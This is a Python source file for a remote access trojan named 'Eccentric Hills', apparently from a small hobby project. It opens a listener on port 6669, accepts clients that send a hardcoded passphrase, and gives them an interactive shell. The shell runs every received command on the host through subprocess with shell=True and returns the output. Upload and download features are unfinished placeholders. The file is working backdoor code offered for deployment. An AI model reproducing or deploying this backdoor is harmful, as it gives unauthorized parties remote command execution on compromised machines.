#ECCENTRIC_HILLS - *NIX Server Deployment Binary
#Written by Gunnar Jones - @gunSec and Austin Crinkaw - @acrinklaw
#https://github.com/acrinklaw/eccentric_hills
#grabbing our libraries
import socket
import threading
import os
import subprocess
import re
#grab some easy system info to pass to client upon connection

#Set server to accept connections from any interface, port 6669
BINDIP = "0.0.0.0"
BINDPORT = 6669
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((BINDIP,BINDPORT))

IP = subprocess.check_output("ifconfig",stderr=subprocess.
STDOUT, shell=True)
IP = str(re.findall( r'[0-9]+(?:.[0-9]+){3}', IP)[0])

#server can handle up to 3 concurrent sessions
server.listen(3)




def upload(clientSocket):
    i = 2 #Placeholder
#client -> server
    #TODO THIS


def download():
    i = 1 #Placeholder
#server -> client



def commands(command):
    command = command.rstrip()
    #Debug statement
    if command == "":
        return command
    elif command[0] != "!":
        try:
            result =  subprocess.check_output(command,stderr=subprocess.
STDOUT, shell=True)
            result = "\n" + result
            return result
        except:
            result = "\nCommand Indicated Failure.\n"
            return result

    elif command[0] == "!":
        command = command[1:]
        if command == "upload":
            #TODO WORK ON UPLOAD
            upload(clientSocket)
        elif command == 'download':
            i = 3 #Placeholder
    else:
        sys.exit(1)
##
#main server functions, command parsing
def shell(clientSocket):
    while True:
        clientSocket.send("\nECHI %s> !!"%IP)
        buffer = ""
        while "\n" not in buffer:
            buffer += clientSocket.recv(1024)
        if "quit" in buffer:
            clientSocket.close()
            break
        else:
            response = commands(buffer)
            try:

                clientSocket.send(response)
            except:
                continue


#Client Handler, require predetermined hash/passphrase to establish connection
def handleClient(clientSocket):
    hashpass = clientSocket.recv(1024)
    if hashpass == 'gunclawpythonratniBBa':
        #send the w and uname to client, jump to shell loop
        clientSocket.send("\n[+] Accepted Connection\n")
        shell(clientSocket)
    else:
        clientSocket.close()


#Main, waiting for connection loop
def main():
    while True:
        client,addr = server.accept()
        clientHandler = threading.Thread(target=handleClient,args=(client,))
        clientHandler.start()


if __name__ == '__main__':
    main()
